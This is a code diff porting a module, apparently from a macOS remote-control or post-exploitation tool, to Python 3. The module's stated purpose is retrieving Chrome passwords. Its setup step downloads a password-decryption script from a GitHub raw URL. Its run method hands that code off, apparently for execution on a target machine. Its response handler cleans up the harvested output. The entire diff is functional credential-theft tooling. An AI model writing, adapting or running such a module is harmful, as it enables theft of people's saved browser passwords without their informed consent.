@@ -1,10 +1,13 @@
-import urllib2
-import re
+from modules.helpers import ModuleABC
+import urllib.request
 
 
-class Module:
+class Module(ModuleABC):
     def __init__(self):
-        self.info = {
+        self.code = None
+
+    def get_info(self):
+        return {
             "Author": ["Marten4n6"],
             "Description": "Retrieves Chrome passwords.",
             "References": [
@@ -12,28 +15,28 @@ class Module:
             ],
             "Task": False
         }
-        self.code = None
 
-    def setup(self, module_view, output_view, successful):
-        module_view.add("This will prompt the user to allow keychain access.", "attention")
-        confirm = module_view.prompt("Are you sure you want to continue? [Y/n]: ").lower()
+    def setup(self, module_input, view, successful):
+        module_input.add("This will prompt the user to allow keychain access.", "attention")
+        confirm = module_input.prompt("Are you sure you want to continue? [Y/n]: ").lower()
 
         if not confirm or confirm == "y":
             request_url = "https://raw.githubusercontent.com/manwhoami/OSXChromeDecrypt/master/chrome_passwords.py"
-            request = urllib2.Request(url=request_url)
-            response = "".join(urllib2.urlopen(request).readlines())
+            request = urllib.request.Request(url=request_url)
+            response = urllib.request.urlopen(request).read()
 
-            self.code = response
+            self.code = response.decode()
             successful.put(True)
         else:
-            output_view.add("Cancelled", "info")
+            view.output("Cancelled", "info")
             successful.put(False)
 
     def run(self):
         return self.code
 
-    def process_response(self, output_view, response):
+    def process_response(self, response: bytes, view):
         # Remove the useless colors, thanks.
-        output_view.add(response.replace("\033[32m", "")
-                        .replace("\033[35m", "").replace("\033[34m", "")
-                        .replace("\033[1m", "").replace("\033[0m", "").replace("\\t", " " * 7))
+        view.output(response.decode()
+                    .replace("\033[32m", "").replace("\033[35m", "")
+                    .replace("\033[34m", "").replace("\033[1m", "")
+                    .replace("\033[0m", "").replace("\\t", " " * 7))
